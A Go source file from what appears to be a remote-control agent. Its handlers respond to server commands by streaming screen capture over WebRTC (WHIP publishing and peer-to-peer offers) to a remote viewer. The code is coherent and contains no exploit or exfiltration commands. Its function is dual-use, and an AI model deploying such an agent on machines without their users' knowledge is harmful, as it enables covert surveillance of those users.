package handlers

import (
	"context"
	"fmt"
	"log"
	"net/url"
	"strings"

	"overlord-client/cmd/agent/capture"
	"overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/webrtcpub"
	"overlord-client/cmd/agent/wire"
)

func handleWebrtcPublish(ctx context.Context, env *runtime.Env, cmdID string, payload map[string]interface{}) error {
	whipPath, _ := payload["whipPath"].(string)
	token, _ := payload["token"].(string)
	if whipPath == "" || token == "" {
		sendCommandResultSafe(env, cmdID, false, "missing whipPath/token")
		return nil
	}

	whipURL, err := buildWhipURL(env, whipPath)
	if err != nil {
		sendCommandResultSafe(env, cmdID, false, err.Error())
		return nil
	}

	opts := webrtcpub.Options{
		WhipURL:               whipURL,
		PublishToken:          token,
		TLSInsecureSkipVerify: env.Cfg.TLSInsecureSkipVerify,
		TLSCAPath:             env.Cfg.TLSCAPath,
	}

	goSafe("webrtc publish", env.Cancel, func() {
		if _, err := webrtcpub.Start(ctx, opts); err != nil {
			log.Printf("webrtc: publish start failed: %v", err)
			_ = wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
				Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error(),
			})
			return
		}
		// Force the encoder to emit a fresh SPS/PPS/IDR so the freshly
		// subscribed viewer can start decoding immediately — otherwise it has
		// to wait up to keyframeEvery for the next natural IDR.
		capture.ResetPrev()
		_ = wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
			Type: "command_result", CommandID: cmdID, OK: true,
		})
	})
	return nil
}

func handleWebrtcStop(ctx context.Context, env *runtime.Env, cmdID string) error {
	_ = ctx
	webrtcpub.Stop()
	sendCommandResultSafe(env, cmdID, true, "")
	return nil
}

func handleWebrtcP2POffer(ctx context.Context, env *runtime.Env, cmdID string, payload map[string]interface{}) error {
	sessionID, _ := payload["sessionId"].(string)
	offerSDP, _ := payload["sdp"].(string)
	if sessionID == "" || offerSDP == "" {
		sendCommandResultSafe(env, cmdID, false, "missing sessionId/sdp")
		return nil
	}

	callbacks := webrtcpub.P2POfferCallbacks{
		OnICE: func(c webrtcpub.ICECandidate) {
			if c.Candidate == "" {
				return
			}
			_ = wire.WriteMsg(ctx, env.Conn, wire.WebRTCP2PIce{
				Type:          "webrtc_p2p_ice",
				SessionID:     sessionID,
				Candidate:     c.Candidate,
				SDPMid:        c.SDPMid,
				SDPMLineIndex: c.SDPMLineIndex,
			})
		},
		OnClose: func() {
			log.Printf("webrtc: P2P session %s closed", sessionID)
		},
	}

	answerSDP, err := webrtcpub.StartP2POffer(ctx, sessionID, offerSDP, callbacks)
	if err != nil {
		sendCommandResultSafe(env, cmdID, false, err.Error())
		return nil
	}
	// Force a fresh SPS/PPS/IDR so the new P2P viewer can decode immediately.
	capture.ResetPrev()
	_ = wire.WriteMsg(ctx, env.Conn, wire.WebRTCP2PAnswer{
		Type:      "webrtc_p2p_answer",
		SessionID: sessionID,
		SDP:       answerSDP,
	})
	sendCommandResultSafe(env, cmdID, true, "")
	return nil
}

func handleWebrtcP2PIce(_ context.Context, env *runtime.Env, cmdID string, payload map[string]interface{}) error {
	sessionID, _ := payload["sessionId"].(string)
	candidate, _ := payload["candidate"].(string)
	mid, _ := payload["sdpMid"].(string)
	var idx uint16
	if v, ok := payloadInt32(payload, "sdpMLineIndex"); ok {
		idx = uint16(v)
	}
	webrtcpub.AddP2PICECandidate(sessionID, webrtcpub.ICECandidate{
		Candidate:     candidate,
		SDPMid:        mid,
		SDPMLineIndex: idx,
	})
	_ = env
	_ = cmdID
	return nil
}

func handleWebrtcP2PStop(_ context.Context, env *runtime.Env, cmdID string) error {
	webrtcpub.StopP2P()
	sendCommandResultSafe(env, cmdID, true, "")
	return nil
}

func buildWhipURL(env *runtime.Env, whipPath string) (string, error) {
	if len(env.Cfg.ServerURLs) == 0 {
		return "", fmt.Errorf("no server URLs configured")
	}
	idx := env.Cfg.ServerIndex
	if idx < 0 || idx >= len(env.Cfg.ServerURLs) {
		idx = 0
	}
	base, err := url.Parse(env.Cfg.ServerURLs[idx])
	if err != nil {
		return "", fmt.Errorf("parse server url: %w", err)
	}
	switch strings.ToLower(base.Scheme) {
	case "wss":
		base.Scheme = "https"
	case "ws":
		base.Scheme = "http"
	}
	if !strings.HasPrefix(whipPath, "/") {
		whipPath = "/" + whipPath
	}
	base.Path = whipPath
	base.RawQuery = ""
	base.Fragment = ""
	return base.String(), nil
}
